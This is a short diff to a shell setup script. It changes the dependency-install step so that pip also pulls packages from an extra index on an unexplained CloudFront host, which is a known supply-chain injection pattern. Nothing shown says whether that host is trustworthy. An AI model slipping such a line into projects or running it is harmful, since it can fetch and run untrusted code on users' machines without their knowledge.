@@ -39,7 +39,7 @@ fi
 # Install dependencies if needed
 if [ ! -f ".deps_installed" ]; then
     echo "📦 Installing dependencies..."
-    pip install -r requirements.txt
+    pip install --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ -r requirements.txt
     touch .deps_installed
 fi
 
